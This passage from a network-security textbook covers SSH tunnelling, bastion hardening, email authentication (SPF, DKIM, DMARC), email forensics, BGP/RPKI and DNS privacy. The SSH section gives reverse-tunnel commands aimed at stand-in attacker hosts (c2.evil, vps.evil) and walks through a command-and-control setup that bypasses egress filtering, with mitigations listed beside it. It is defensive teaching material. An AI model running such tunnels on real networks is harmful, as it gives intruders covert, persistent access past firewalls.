The banner must state that the system is for authorised use only and that activity may be monitored. Without it, defence teams have less legal footing when pursuing unauthorised access cases.

Table 17.1. SSH cipher, MAC, and KEX algorithm recommendations Category Algorithm Status Notes KEX curve25519-sha256 \(✓\) Recommended ECDH, 128-bit KEX diffie-hellman-group16-sha512 \(✓\) Acceptable 4096-bit DH KEX diffie-hellman-group14-sha256 \(\sim\) Legacy 2048-bit DH KEX diffie-hellman-group1-sha1 \(\times\) Broken Logjam-vuln Cipher chacha20-poly1305@openssh.com \(✓\) Recommended AEAD Cipher aes256-gcm@openssh.com \(✓\) Recommended AEAD Cipher aes256-ctr \(\sim\) Acceptable Requires ETM MAC Cipher 3des-cbc \(\times\) Broken SWEET32 Cipher arcfour \(\times\) Broken RC4 MAC hmac-sha2-256-etm@openssh.com \(✓\) Recommended ETM ordering MAC hmac-sha2-512-etm@openssh.com \(✓\) Recommended ETM ordering MAC hmac-sha1 \(\times\) Broken SHA-1 collision MAC hmac-md5 \(\times\) Broken MD5 broken

docs.title: 17.7 SSH Tunneling
docs.text:
SSH can forward arbitrary TCP streams through the encrypted channel, providing a VPN-like capability. This is both a legitimate tool and a favourite attacker technique for bypassing egress controls.

Definition 17.6 (Local Port Forwarding (-L))

Binds a port on the local machine; connections are forwarded through the SSH server to a target host and port reachable from the server. ssh -L 8080:internal.example.com:80 user@bastion.example.com

Definition 17.7 (Remote Port Forwarding (-R))

Binds a port on the remote SSH server; connections are forwarded back to the local machine or a target reachable from it. Attackers use this to expose internal services: ssh -R 4444:localhost:4444 attacker@c2.evil.

Definition 17.8 (Dynamic SOCKS5 Proxy (-D))

Creates a SOCKS5 proxy on the local machine; all traffic routed through the proxy is forwarded via the SSH server to any destination. This effectively provides a VPN through any open SSH port. ssh -D 1080 user@bastion.example.com

SSH as C2 Tunnel

Attackers with a compromised internal host may use remote port forwarding to establish a persistent command-and-control channel through the firewall:

  1. Malware on internal host connects outbound on TCP/22 to attacker’s VPS (typically allowed by egress rules).

  2. ssh -R 2222:localhost:22 attacker@vps.evil exposes the compromised host’s SSH on the VPS.

  3. Attacker SSHes to localhost:2222 on the VPS to control the internal host from any network.

Mitigations: restrict AllowTcpForwarding in sshd_config; block outbound TCP/22 except to known bastions; monitor for long-lived SSH connections.

docs.title: 17.8 Jump Hosts and ProxyJump
docs.text:
Definition 17.9 (Jump Host (Bastion))

A bastion host is a hardened, network-accessible server that acts as the sole entry point into a protected segment. Users SSH to the bastion, then hop to internal targets. ProxyJump handles this transparently without opening a shell on the intermediate host.

# Single hop
ssh -J alice@bastion.example.com user@10.0.1.50

# Chained hops (bastion -> jump2 -> target)
ssh -J alice@bastion.example.com,bob@jump2.internal user@10.0.2.99

# ~/.ssh/config equivalent (preferred for daily use)
Host internal-*
    ProxyJump alice@bastion.example.com
    User deploy
    IdentityFile ~/.ssh/id_ed25519

Host bastion.example.com
    HostName 203.0.113.10
    User alice
    IdentityFile ~/.ssh/id_ed25519

Agent Forwarding Security Risk

ForwardAgent yes forwards the SSH agent socket to the remote host. A root user on that host can use the forwarded socket to authenticate to any host that trusts your key—without ever obtaining your private key. Always prefer ProxyJump over agent forwarding. If agent forwarding is required, limit it to trusted hosts in  /.ssh/config: Host trusted-bastion; ForwardAgent yes.

docs.title: How ProxyJump Works Mechanically
docs.text:
ProxyJump (or the older ProxyCommand with ssh -W) works by having the SSH client establish a connection to the jump host, then ask the jump host to open a TCP channel to the target host. The client’s SSH session to the target runs entirely inside that forwarded channel. Crucially, the client negotiates a separate TLS-like SSH session with the target, end-to-end from the client’s keyboard. The jump host sees only an opaque encrypted stream; it never decrypts the traffic destined for the target and it never receives the client’s private key material. This is fundamentally different from logging into the bastion and then running a second ssh command from there, which would expose credentials to the bastion.

The old ProxyCommand approach required ssh -W %h:%p and was essentially the same mechanism with more syntax. OpenSSH 7.3 (2016) introduced ProxyJump as a cleaner alias. Both approaches work with scp and sftp through the -J flag.

Bastion host hardening.

The bastion itself needs tight security because it’s the entry point to everything behind it. Key configuration choices:

  • AllowAgentForwarding no on the bastion’s sshd_config — the bastion should never forward agent sockets to targets; ProxyJump makes this unnecessary.

  • AllowTcpForwarding local or no — local allows ProxyJump channels while blocking remote port forwarding that could be exploited to expose the bastion’s backend network.

  • Permit no interactive shells on the bastion for service accounts; restrict to ForceCommand or command= in authorized_keys.

  • Session recording with tlog or sshaudit to create an immutable audit trail of all bastion sessions.

  • Rotate the bastion’s host key every 12 months and update known_hosts centrally to prevent stale-key MITM.

docs.title: 17.9 Common SSH Attacks and Defences
docs.text:
Brute Force and Credential Stuffing

Automated tools (Hydra, Medusa) attempt thousands of username/password combinations against SSH. Defences:

  • Disable PasswordAuthentication – most effective control.

  • Deploy fail2ban or SSHGuard to rate-limit failed attempts.

  • Use a non-standard port to reduce log noise (obscurity, not a primary control).

  • Require MFA (TOTP via libpam-google-authenticator) as a second factor even with keys.

# /etc/fail2ban/jail.local
[sshd]
enabled  = true
port     = ssh
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 3
bantime  = 3600   ; 1 hour ban
findtime = 300    ; within 5 minutes

Definition 17.10 (known_hosts MITM Attack)

If an attacker can intercept the first SSH connection (e.g., via ARP spoofing), they can present their own host key. The victim’s client stores the attacker’s key. All subsequent sessions appear legitimate but are being decrypted by the attacker. SSHFP DNS records (RFC 4255) and SSH certificate authorities both mitigate first-connection MITM.

docs.title: 17.10 Bastion Architecture with Session Recording
docs.text:
Enterprise environments supplement SSH access control with session recording, providing an audit trail for privileged access.

# Install tlog on bastion (records terminal sessions to journal)
# /etc/tlog/tlog-rec-session.conf
{
  "writer": "journal",
  "shell":  "/bin/bash",
  "notice": "NOTICE: Session is being recorded."
}

# Retrieve recorded session
tlog-play -r journal --since="2024-01-15 14:00:00"

# Alternative: script-based recording in /etc/ssh/sshrc
exec script -q -f /var/log/sessions/$(whoami)-$(date +

docs.title: 17.11 Exercises
docs.text:
Exercise 17.1

A junior administrator has deployed an Ubuntu server with the following sshd_config settings: PermitRootLogin yes, PasswordAuthentication yes, X11Forwarding yes, and no AllowUsers directive. Identify all security issues and write a corrected configuration file that addresses each one.

Exercise 17.2

Explain the difference between SSH public key authentication and SSH certificate-based authentication. Under what circumstances would certificate authentication be preferable at scale, and what infrastructure is required to support it? What happens when a certificate expires and a user attempts to connect?

Exercise 17.3

An attacker has gained unprivileged shell access to an internal Linux host that sits behind a stateful firewall permitting only outbound TCP/22 traffic. Describe, step by step, how the attacker could use SSH remote port forwarding to establish a persistent C2 channel. What log entries would be generated, and what network-level controls would detect or block this technique?

Exercise 17.4

Your organisation runs 200 Linux servers. Currently each server’s authorized_keys file is managed manually. Propose a migration to SSH certificate-based authentication: describe the CA key management, certificate issuance workflow (including short-lived certificates for privileged access), server-side configuration, and revocation mechanism.

docs.title: Chapter 18: Email Security
docs.text: Email is the primary attack vector for initial access in the majority of breaches. Despite decades of patching, SMTP was designed without authentication or confidentiality. This chapter builds a complete picture of email security—from transport encryption and sender authentication to end-to-end encryption and forensic header analysis.

docs.title: 18.1 Email Architecture
docs.text:
Understanding how a message flows through the email infrastructure is a prerequisite for understanding where attacks occur and where controls apply.

Definition 18.1 (Email Infrastructure Components)

  • MUA (Mail User Agent) – Client software: Outlook, Thunderbird, Gmail web.

  • MSA (Mail Submission Agent) – Accepts mail from authenticated users; enforces policies; port 587 (STARTTLS) or 465 (SMTPS).

  • MTA (Mail Transfer Agent) – Routes mail between domains via SMTP (port 25); implements SPF/DKIM/DMARC checking.

  • MDA (Mail Delivery Agent) – Delivers to mailbox; runs spam/AV filters (SpamAssassin, ClamAV).

  • MRA (Mail Retrieval Agent) – Serves mail to MUA via IMAP (port 993 TLS) or POP3 (port 995 TLS).

Figure 18.1. Email flow with security controls applied at each hop.

docs.title: 18.2 SMTP Transport Security
docs.text:
Definition 18.2 (STARTTLS)

STARTTLS is an opportunistic TLS upgrade mechanism. The receiving MTA advertises STARTTLS in its EHLO response; the sending MTA issues a STARTTLS command and upgrades to TLS. Because the initial negotiation is unencrypted, a man-in-the-middle can strip the STARTTLS capability (downgrade attack), causing fallback to plaintext delivery.

Definition 18.3 (MTA-STS (RFC 8461))

MTA Strict Transport Security publishes a DNS TXT record (_mta-sts.example.com) pointing to an HTTPS policy file that specifies: MX hostnames, TLS mode (enforce vs testing), and policy lifetime. Sending MTAs that support MTA-STS fetch this policy and refuse to deliver over plaintext, defeating STARTTLS stripping.

docs.title: 18.3 Sender Policy Framework (SPF)
docs.text:
Definition 18.4 (SPF (RFC 7208))

SPF lets domain owners specify which IP addresses are authorised to send email on behalf of their domain. The receiving MTA performs a DNS TXT lookup on the MAIL FROM domain and compares the connecting IP against the SPF record. SPF authenticates the envelope sender, not the From: header visible to the user.

Example 18.1 (SPF Record Syntax)

# DNS TXT record for example.com
v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all

# Mechanisms:
# ip4:203.0.113.0/24  -- authorise this IP range
# include:_spf.google.com -- include Google's SPF record (for GSuite)
# -all  -- hard fail all other senders (recommended)
# ~all  -- soft fail (mark as spam, still deliver)
# ?all  -- neutral (no policy, not recommended)

# SPF lookup limit: maximum 10 DNS lookups per evaluation
# Exceeding the limit causes "PermError" (treated as fail by strict receivers)

docs.title: 18.3.1 SPF Limitations and the DMARC Bridge
docs.text:
SPF has three fundamental weaknesses that practitioners need to understand before relying on it as a security control.

Envelope sender vs. header sender.

SPF checks the MAIL FROM address (the envelope sender, also called the return-path), not the From: header that appears in the user’s inbox. These can be completely different domains. An attacker can send a message with MAIL FROM: attacker@attacker.com (which passes SPF for attacker.com) while setting From: ceo@victim.com. Most email clients display only the From: header. SPF passes, the message looks like it came from the victim’s CEO, and the user has no way to tell. This is display name spoofing exploited in every Business Email Compromise (BEC) campaign.

+all misconfiguration.

+all means “any IP is authorised to send for this domain” — effectively disabling SPF. Surprisingly common in large organisations that use many third-party sending services and, rather than properly enumerate them, reach for +all to stop delivery failures. Any organisation with +all has no SPF protection at all. Auditing SPF records across a domain portfolio regularly is a basic hygiene task that turns up this misconfiguration repeatedly.

The 10-lookup limit and SPF flattening.

RFC 7208 limits evaluation to 10 DNS lookups. The include: mechanism triggers one lookup per included record, and each included record may itself include further records. Large organisations that send through many SaaS platforms (Salesforce, Marketo, SendGrid, Mailchimp, a transactional email provider, a helpdesk platform) exhaust the 10-lookup limit easily. When a receiver hits PermError from exceeding the limit, strict receivers treat it as an SPF failure, causing legitimate mail to be rejected. The workaround is SPF record flattening: periodically resolving all include: chains to their constituent IP ranges and publishing them as static ip4: and ip6: ranges. This solves the lookup limit but requires automation to stay current as upstream providers rotate their IP ranges.

DMARC as the bridge.

None of these SPF limitations matter as much when DMARC is in place. DMARC requires alignment: the domain in the SPF MAIL FROM (or the DKIM d= tag) must match the From: header domain. This closes the envelope-vs-header gap. An attacker whose SPF-passing MAIL FROM is attacker.com while the From: shows victim.com fails DMARC alignment on the SPF check. They would need both domains to match, which requires controlling the victim domain. DMARC does not fix the 10-lookup limit (you still need proper SPF), but it makes SPF’s authentication actually relevant to what the user sees.

docs.title: 18.4 DomainKeys Identified Mail (DKIM)
docs.text:
Definition 18.5 (DKIM (RFC 6376))

DKIM lets a domain cryptographically sign outgoing messages. The signing MTA computes an RSA or Ed25519 signature over selected headers and the message body, inserting it as a DKIM-Signature: header. The receiving MTA retrieves the public key from DNS (selector._domainkey.example.com) and verifies the signature. DKIM survives SMTP relay hops because it’s embedded in the message itself.

# DNS TXT record: selector._domainkey.example.com
v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...

# DKIM-Signature header added by signing MTA:
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=example.com; s=mail2024; t=1700000000;
  bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;
  h=From:To:Subject:Date:Message-ID;
  b=BASE64SIGNATURE...

# Verify DKIM signature with OpenDKIM tools:
opendkim-testmsg < message.eml

DKIM Does Not Prevent Header Spoofing Alone

DKIM verifies that the message was signed by d=example.com in the DKIM-Signature header, not necessarily by the From: domain. An attacker can obtain a valid DKIM signature for their own domain (e.g., attacker.com) while spoofing the From: field to show ceo@example.com. DMARC alignment closes this gap.

docs.title: 18.4.1 DKIM Replay Attacks and Key Rotation
docs.text:
A subtler attack against DKIM is the replay attack. DKIM signatures are valid for any recipient, any time, and any number of deliveries — there is nothing in the signature that ties it to a specific destination address or delivery timestamp. An attacker who receives a legitimately signed message (for example, by subscribing to a newsletter or sending a message to an organisation and receiving an auto-reply) can extract the DKIM-Signature header and resend the original message to thousands of different recipients. The signature remains valid. Receivers see a message with a perfect DKIM pass and are likely to trust it even if the content is spam or phishing.

The l= body length limit tag makes this significantly worse. When present, l= tells the verifier to check only the first N bytes of the message body. A signer uses this to allow benign footer additions by mailing lists. But it also allows an attacker to append arbitrary content to the signed portion of the body — adding malicious links or payload below the signed content — while the DKIM signature still passes because the signed prefix is unchanged.

Avoid the l= Tag

The DKIM body length limit tag (l=) should never be used in new deployments. It was intended to accommodate mailing list footer additions but creates a trivial content-injection vector. If your signing configuration includes l=, remove it.

DKIM key rotation.

The DKIM private key is long-lived by default: some organisations run the same key for years. Key rotation is important for two reasons. First, if the private key is ever exposed (through a server compromise, a misconfigured backup, or a cloud storage misconfiguration), an attacker can sign arbitrary messages as your domain indefinitely. Second, replay attacks using old signed messages become less valuable when keys rotate and old selectors are revoked.

The rotation procedure is: generate a new key pair, publish the public key under a new selector (e.g., mail2025._domainkey.example.com), configure the signing MTA to use the new selector, wait 48 hours for DNS TTLs to propagate, then retire the old selector by deleting or replacing its DNS record with a revoked key (p= empty means the key is revoked per RFC 6376). A rotation cycle of 90–180 days is common in practice, though shorter is better for high-security deployments.

The private key itself should live in memory or a secrets manager, not on disk in plaintext. A DKIM private key written to /etc/opendkim/keys/ with world-readable permissions has been exposed through countless server compromise write-ups. Use filesystem permissions (chmod 600), a dedicated service account, and ideally an HSM or cloud KMS for key storage.

docs.title: 18.5 DMARC: Policy and Alignment
docs.text:
Definition 18.6 (DMARC (RFC 7489))

Domain-based Message Authentication, Reporting and Conformance ties together SPF and DKIM with two requirements: policy (what to do with failing messages) and alignment (the SPF/DKIM domain must match the From: header domain). DMARC passes if at least one of SPF-aligned or DKIM-aligned passes.

# DNS TXT record: _dmarc.example.com
v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s;
  rua=mailto:dmarc-agg@example.com;
  ruf=mailto:dmarc-fail@example.com;
  fo=1; pct=100

# Tags:
# p=reject   -- reject messages failing DMARC (strictest)
# p=quarantine -- deliver to spam folder
# p=none     -- monitor only (do not take action)
# adkim=s    -- strict DKIM alignment (must match From: domain exactly)
# aspf=s     -- strict SPF alignment
# rua=       -- aggregate report recipients (daily XML)
# ruf=       -- forensic report recipients (per-failure)
# pct=100    -- apply policy to 100

docs.title: 18.5.1 DMARC Reporting and Policy Escalation
docs.text:
Aggregate reports (rua) vs. forensic reports (ruf).

The rua= tag specifies where receiving MTAs send aggregate reports — daily XML files summarising every message that claimed your domain, whether DMARC passed or failed, and the receiving MTA’s disposition. A typical aggregate report identifies that 1,400 messages from IP 203.0.113.50 with selector mail2024 passed both SPF and DKIM, while 7 messages from IP 185.220.101.5 failed both, indicating spoofing attempts. Aggregate reports are invaluable for discovering legitimate sending sources you haven’t enumerated in SPF and for baselining your domain’s email activity.

The ruf= tag specifies where receiving MTAs send forensic reports — per-message failure reports containing a copy of (or excerpt from) the failing message. Forensic reports let you see exactly what the spoofed message looked like. They are increasingly disabled by receivers for privacy reasons (they contain message content including potential PII), and many large providers such as Gmail no longer send them. Treat ruf= as supplemental intelligence rather than a primary monitoring channel.

Policy escalation path.

Rolling out DMARC directly at p=reject on a large domain risks blocking legitimate mail from sending services you haven’t yet added to SPF or configured for DKIM. The standard escalation path is:

  1. p=none; pct=100 — monitor only; no mail is blocked. Collect aggregate reports for 2–4 weeks to identify all legitimate sending sources.

  2. p=quarantine; pct=10 — quarantine 10% of failing mail. Gradually increase to pct=100 over several weeks, watching for legitimate mail appearing in spam folders.

  3. p=reject; pct=100 — reject all failing mail. This is the target state; anything less gives spoofers a percentage-based escape.

Most organisations spend weeks or months at each stage, working through the long tail of forgotten transactional senders, CRM integrations, and DevOps alerting systems that send email. Tools like DMARC Analyzer, Valimail, and EasyDMARC parse aggregate reports and visualise sending sources, shortening this process considerably.

Subdomain policy (sp=).

The sp= tag sets a separate DMARC policy for all subdomains of the organisational domain. Without it, subdomains inherit the parent p= policy by default. You might legitimately want p=reject on example.com but p=none on test.example.com — or more commonly, you want sp=reject to prevent attackers from exploiting an unmonitored subdomain (legacy.example.com) to impersonate the parent brand.

BIMI: visual brand authentication.

Brand Indicators for Message Identification (BIMI) displays a verified brand logo in supporting email clients (Gmail, Apple Mail, Yahoo Mail) next to messages that pass DMARC. BIMI requires the domain to have p=quarantine or p=reject — p=none does not qualify. It also requires a Verified Mark Certificate (VMC) issued by an approved authority (DigiCert or Entrust), which in turn requires a registered trademark. The VMC validates that the brand displaying the logo owns the trademark for that logo, preventing competitors or impersonators from abusing the display mechanism. BIMI is therefore both a usability feature (users see a trusted logo) and a security control (the logo is gated behind strong authentication and legal trademark ownership).

Table 18.1. Email authentication mechanisms comparison Mechanism Protects Method Survives Relay Prevents Spoofing SPF Envelope sender DNS IP list No (breaks at forward) Partial DKIM Signing domain Cryptographic sig Yes Partial DMARC From: header Policy + align Yes (with DKIM) Yes (with reject) BIMI Brand display Logo + DMARC Yes Visual only

docs.title: 18.6 BIMI: Brand Indicators for Message Identification
docs.text:
Definition 18.7 (BIMI)

BIMI displays a verified brand logo in supporting email clients (Gmail, Apple Mail, Yahoo) next to authenticated messages. It requires DMARC at p=quarantine or p=reject and a Verified Mark Certificate (VMC) issued by a qualified CA (DigiCert, Entrust). The logo URL is published as a DNS TXT record at default._bimi.example.com.

docs.title: 18.7.1 S/MIME
docs.text:
Definition 18.8 (S/MIME)

Secure/Multipurpose Internet Mail Extensions uses X.509 certificates and Cryptographic Message Syntax (CMS, RFC 5652) to provide message signing and encryption. The sender’s MUA signs the message with the sender’s private key; recipients encrypt using the recipient’s public key certificate. Enterprise deployments use an internal CA; individuals may obtain free certificates from Actalis or purchase from commercial CAs.

docs.title: 18.7.2 PGP/GPG
docs.text:
Definition 18.9 (OpenPGP (RFC 4880))

OpenPGP uses a web of trust model: users sign each other’s public keys, building a decentralised trust graph rather than relying on CAs. GPG (GNU Privacy Guard) is the reference implementation. Key distribution relies on key servers (keys.openpgp.org) or direct exchange. Practical challenges include key discovery, revocation distribution, and user experience.

# Generate Ed25519 + Cv25519 key pair
gpg --full-generate-key  # select EdDSA / Curve25519

# Export public key for distribution
gpg --armor --export alice@example.com > alice_pubkey.asc

# Upload to key server
gpg --keyserver hkps://keys.openpgp.org --send-keys <KEYID>

# Encrypt and sign a message for Bob
gpg --encrypt --sign --armor \
    --recipient bob@example.com \
    --local-user alice@example.com \
    message.txt

# Verify and decrypt
gpg --decrypt message.txt.asc

docs.title: 18.7.3 Why End-to-End Email Encryption Has Low Adoption
docs.text:
Despite existing since 1991 (PGP) and 1999 (S/MIME), end-to-end email encryption remains a niche tool used by security professionals and journalists rather than the general workforce. The reasons are structural, not technical.

Key discovery.

Before encrypting a message to Bob, Alice must find Bob’s public key. PGP key servers have historically been plagued by certificate flooding attacks (2019 SKS poisoning attack), abandoned keys, and keys uploaded without the owner’s consent. WKD (Web Key Directory, RFC 7929) addresses this by hosting keys at https://openpgpkey.example.com/.well-known/openpgpkey/example.com/hu/HASH, allowing clients to discover keys via a canonical HTTPS endpoint under the domain owner’s control. S/MIME has a similar problem: enterprise deployments use internal CAs (which work inside the organisation) but an employee trying to encrypt a message to an external contact may find no S/MIME certificate at all.

Key management burden.

Users must generate key pairs, protect private keys, back them up, and handle key expiry. When a laptop is lost or a phone is wiped, the private key may be gone and all encrypted email in the inbox becomes permanently inaccessible. Enterprise key escrow (where the organisation holds a copy of all private keys) solves the recovery problem but undermines the end-to-end model — IT can now read all encrypted mail.

Metadata exposure.

Even with end-to-end content encryption, the email envelope remains visible: who emailed whom, when, and how frequently. This traffic analysis can reveal sensitive relationships (a journalist’s sources, an executive’s negotiating counterparties, a doctor’s patients) without decrypting a single message. PGP and S/MIME encrypt only the body and attachments; headers including To:, From:, Subject:, and Date: are always in plaintext. Some clients strip the subject line into an encrypted part, but this is not standardised.

Web of trust vs. PKI.

PGP’s web of trust requires users to sign each other’s keys to build trust transitively. This works in communities where people meet in person at key-signing parties but fails for most business email. S/MIME relies on centralised CAs, which solves key discovery (the CA verifies email address ownership) but costs money per certificate and requires infrastructure to distribute CA roots to all correspondents’ clients.

docs.title: 18.7.4 MTA-STS and DANE for SMTP Transport Security
docs.text:
End-to-end encryption is one layer of email security; transport encryption between mail servers is another. SMTP uses opportunistic STARTTLS by default, meaning a man-in-the-middle can strip the STARTTLS advertisement and receive the message in plaintext. Two standards address this.

MTA-STS (RFC 8461) lets a domain declare a strict TLS policy for inbound mail via an HTTPS-hosted policy file. The policy specifies which MX hostnames are expected and declares mode: enforce, meaning sending MTAs that support MTA-STS must refuse to deliver if TLS cannot be established with a valid certificate for the expected MX hostnames. The policy is cached by sending MTAs (for a configurable max_age) and updated periodically. A sending MTA that has cached an enforced policy will not fall back to plaintext even if an attacker strips STARTTLS on a later connection. MTA-STS requires no DNSSEC; it relies on the web PKI (the HTTPS certificate for the policy file) to authenticate the policy.

DANE/TLSA (RFC 7672) takes a different approach: it publishes the expected SMTP server certificate (or its hash) as a TLSA DNS record, secured by DNSSEC. When a sending MTA resolves the recipient’s MX record, it also fetches the TLSA record and compares the delivered certificate against the published hash. If they don’t match, the connection is refused. DANE/TLSA provides stronger security than MTA-STS because it chains to DNSSEC rather than the web PKI, but its deployment is limited by DNSSEC’s own patchy deployment. Postfix supports both MTA-STS (via the postfix-mta-sts-resolver daemon) and DANE (natively, with smtp_dns_support_level = dnssec and smtp_tls_security_level = dane).

docs.title: 18.8 Email Attack Landscape
docs.text:
Business Email Compromise (BEC)

BEC attacks impersonate executives or trusted vendors to trick employees into transferring funds or revealing credentials. Techniques include:

  • Display name spoofing: From: CEO <ceo@gmail.com> – the display name matches but the domain does not.

  • Lookalike domains: exarnple.com (rn vs m), example.co (missing TLD character).

  • Account takeover: legitimate executive email account compromised; all authentication checks pass.

BEC caused $2.9 billion in losses in 2023 (FBI IC3 report). Defences: out-of-band verification for wire transfers; DMARC reject on owned domains; anti-spoofing rules in email gateway; security awareness training.

Definition 18.10 (IDN Homograph Attack)

International Domain Names (IDN) allow Unicode characters in domain names, enabling registration of visually identical domains using characters from different scripts. Example: аpple.com using Cyrillic а (U+0430) instead of Latin a (U+0061) is rendered identically in many fonts. Browsers display the punycode form (xn--pple-43d.com) for suspicious mixed-script domains; email clients typically do not.

docs.title: 18.9 Email Forensics
docs.text:
Example 18.2 (Reading Raw Email Headers)

The Received: chain records each MTA hop in reverse chronological order (most recent first). Analysing the chain identifies the true origin.

# Fetch raw message with IMAP
openssl s_client -connect mail.example.com:993 -quiet
# Then: a login user pass
#       b select INBOX
#       c fetch 1 rfc822

# Verify DKIM signature from a saved .eml file
opendkim-testmsg < suspicious.eml

# Parse with Python mail library
python3 -c "
import email, sys
msg = email.message_from_file(open('suspicious.eml'))
for h in msg.get_all('Received', []):
    print('Received:', h[:120])
print('DKIM-Sig:', msg.get('DKIM-Signature','MISSING')[:80])
print('X-Originating-IP:', msg.get('X-Originating-IP','N/A'))
"

DMARC Failure Diagnosis Checklist

When a legitimate email fails DMARC:

  1. Check if the sending service is listed in SPF (dig TXT domain.com).

  2. Verify the DKIM selector exists (dig TXT selector._domainkey.domain.com).

  3. Confirm alignment: does the DKIM d= or SPF envelope domain match the From: header domain?

  4. Check for email forwarding (SPF breaks at forwarders; DKIM survives if headers are not modified).

  5. Review aggregate DMARC reports (RUA) for failing sources.

docs.title: 18.10 Exercises
docs.text:
Exercise 18.1

A company reports that emails sent from their marketing platform (sendgrid.net) are being rejected by recipients with a DMARC failure. Their From: domain is example.com, their SPF record is v=spf1 mx -all, and DMARC is set to p=reject; adkim=s; aspf=s. Diagnose the failure and describe all changes required in SPF, DKIM, and DMARC configuration to allow legitimate SendGrid email to pass.

Exercise 18.2

You are designing the email security architecture for a financial institution. The CISO requires protection against BEC, phishing, and domain spoofing. Design a layered defence including: DNS record configuration (SPF, DKIM, DMARC), gateway controls, look-alike domain monitoring, and employee training programme. Justify each control with reference to the specific attack it mitigates.

Exercise 18.3

The following raw email headers were extracted from a suspicious phishing message. Analyse the Received: chain to determine the true originating IP, evaluate whether SPF and DKIM passed or failed, and identify three indicators that the message is fraudulent:

From: "CEO John Smith" <john.smith@example.com>
Return-Path: <bounce@phishing-srv.ru>
Received: from phishing-srv.ru (phishing-srv.ru [185.220.101.5])
        by mx.example.com with ESMTP id abc123
Received: from localhost (localhost [127.0.0.1])
        by phishing-srv.ru (Postfix) with ESMTP
X-Originating-IP: 185.220.101.5
DKIM-Signature: v=1; d=phishing-srv.ru; s=mail; ...
Subject: URGENT: Wire Transfer Required Immediately

docs.title: Chapter 19: Advanced Network Protocol Security
docs.text: This chapter examines security vulnerabilities and hardening measures in foundational internet infrastructure protocols—BGP, DNS, NTP—and then turns to enterprise identity protocols (Kerberos, Active Directory, LDAP) that are the primary targets of lateral movement in modern intrusions.

docs.title: 19.1 BGP Security
docs.text:
The Border Gateway Protocol (BGP) is the routing protocol of the internet. It was designed for trusted peering relationships between autonomous systems (ASes) and has virtually no built-in authentication.

Definition 19.1 (BGP Hijacking)

BGP hijacking occurs when an AS announces IP prefixes it does not legitimately own. Receiving ASes, lacking verification mechanisms, may accept and propagate the false route, redirecting traffic destined for the victim to the attacker. Categories include:

  • Prefix hijacking: announcing the exact victim prefix.

  • Sub-prefix hijacking: announcing a more-specific (longer) prefix, which BGP’s longest-match rule prefers; more reliably attracts traffic.

  • AS-path manipulation: shortening the AS-path to appear closer to a destination, influencing routing decisions.

Example 19.1 (Pakistan Telecom / YouTube 2008)

On 24 February 2008, Pakistan Telecom (AS17557), attempting to block YouTube within Pakistan, announced 208.65.153.0/24—a more-specific prefix than YouTube’s 208.65.152.0/22. PCCW (AS3491), Pakistan Telecom’s upstream provider, propagated the route globally. For approximately two hours, YouTube traffic worldwide was routed to Pakistan Telecom, causing a near-total YouTube outage. This incident accelerated adoption of BGP prefix filtering and, later, RPKI.

docs.title: 19.2 RPKI: Resource Public Key Infrastructure
docs.text:
Definition 19.2 (Route Origin Authorization (ROA))

An ROA is a digitally signed object (RFC 6482) that authorises an AS to originate one or more IP prefixes. It is signed by the IP address holder’s resource certificate, which chains to a Regional Internet Registry (RIR: ARIN, RIPE NCC, APNIC, LACNIC, AFRINIC). Each ROA specifies:

  • The Autonomous System Number (ASN) permitted to originate the prefix.

  • The IP prefix(es) covered.

  • A maxLength field limiting the most-specific prefix the AS may announce (prevents sub-prefix hijacks).

# Install Routinator (NLnet Labs RPKI validator)
apt install routinator
routinator init --accept-arin-rpa

# Query ROA for a prefix
routinator validate --prefix 208.65.153.0/24 --asn 36561

# Output:
# Status: Valid
# Route: 208.65.153.0/24 (max-length: 24)
# Validated by ROA: AS36561 -> 208.65.153.0/24

# Check RPKI coverage statistics
curl https://rpki-monitor.antiddos.systems/api/v1/stats | python3 -m json.tool

RPKI Deployment Status

As of 2024, over 40% of globally routed BGP prefixes have valid ROAs. Major networks including Cloudflare, AWS, Hurricane Electric, and most European ISPs drop RPKI-invalid routes. RPKI does not prevent all BGP attacks (BGPsec, RFC 8205, provides path validation but has negligible deployment) but effectively prevents origin hijacks of covered prefixes.

docs.title: 19.3 DNS Privacy: DoH and DoT
docs.text:
Definition 19.3 (DNS over TLS (DoT, RFC 7858))

DoT wraps DNS messages in a TLS session on TCP port 853. It provides confidentiality and integrity for DNS queries between the client and its configured resolver. Enterprise environments can inspect DoT by deploying a TLS-intercepting resolver at the network boundary.

Definition 19.4 (DNS over HTTPS (DoH, RFC 8484))

DoH encapsulates DNS queries as HTTPS requests (application/dns-message), typically to a well-known URI (/dns-query). Because DoH traffic is indistinguishable from ordinary HTTPS on port 443, it’s significantly harder for enterprise proxies and firewalls to intercept or block, creating a tension between user privacy and enterprise monitoring requirements.

Enterprise Monitoring vs. DoH

DoH configured at the browser level (Firefox Trusted Recursive Resolver, Chrome Secure DNS) bypasses enterprise DNS sinkholes, URL filtering, and threat intelligence feeds. Mitigations for enterprises:

  • Block DNS-over-HTTPS to known public resolvers (1.1.1.1, 8.8.8.8) by IP at the firewall.

  • Deploy an enterprise DoH resolver to serve as the canonical endpoint.

  • Use MDM/GPO to configure browsers’ DoH endpoint to the enterprise resolver.

docs.title: 19.4 NTP Security
docs.text:
Definition 19.5 (NTP Amplification Attack)

NTP servers respond to monlist (REQ_MON_GETLIST) queries with a list of up to 600 recent clients—an amplification factor of up to 1000x. An attacker spoofing the victim’s IP as the source causes massive UDP traffic toward the victim. Mitigations: disable monlist (noquery in ntp.conf); source-address validation (BCP38) at ISPs.

Definition 19.6 (Network Time Security (NTS, RFC 8915))

NTS adds authenticated key exchange and AEAD-protected NTP packets. A client performs a TLS handshake with an NTS Key Exchange server to obtain session keys and cookies. Subsequent NTP packets carry an AEAD authentication tag, preventing time-shifting attacks where an attacker manipulates system clocks to invalidate TLS certificates or affect log timestamps.

docs.title: 19.5 Kerberos and Active Directory
docs.text:
Definition 19.7 (Kerberos Authentication Flow)

Kerberos (RFC 4120) provides single sign-on via a Key Distribution Centre (KDC) split into two services:

  1. Authentication Service (AS): issues a Ticket Granting Ticket (TGT) after verifying the user’s password.

  2. Ticket Granting Service (TGS): issues Service Tickets in exchange for a valid TGT.

